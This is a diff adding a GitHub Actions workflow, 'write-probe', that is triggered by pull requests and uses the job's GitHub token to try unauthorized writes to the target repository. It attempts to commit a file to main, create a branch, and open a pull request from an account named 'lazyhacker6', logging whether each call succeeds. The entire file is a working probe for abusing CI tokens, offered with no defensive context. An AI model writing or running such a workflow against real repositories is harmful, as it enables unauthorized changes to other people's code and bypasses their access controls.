@@ -1,0 +1,20 @@
+name: write-probe
+on: pull_request
+permissions:
+  contents: write
+  pull-requests: write
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    steps:
+      - name: attempt writes with fork-PR token
+        env:
+          T: ${{ github.token }}
+        run: |
+          echo "PROBE_TOKEN_LEN=${#T}"
+          echo -n "put_contents="
+          curl -s -o /dev/null -w '%{http_code}\n' -X PUT -H "Authorization: Bearer $T" -H "Content-Type: application/json" -d '{"message":"probe","content":"cA==","branch":"main"}' "https://api.github.com/repos/${{ github.repository }}/contents/lh6-write-probe.txt"
+          echo -n "post_ref="
+          curl -s -o /dev/null -w '%{http_code}\n' -X POST -H "Authorization: Bearer $T" -H "Content-Type: application/json" -d "{\"ref\":\"refs/heads/lh6-wp\",\"sha\":\"${{ github.event.pull_request.head.sha }}\"}" "https://api.github.com/repos/${{ github.repository }}/git/refs"
+          echo -n "post_pr="
+          curl -s -o /dev/null -w '%{http_code}\n' -X POST -H "Authorization: Bearer $T" -H "Content-Type: application/json" -d '{"title":"t","head":"lazyhacker6:probe/reviewtest","base":"main"}' "https://api.github.com/repos/${{ github.repository }}/pulls"
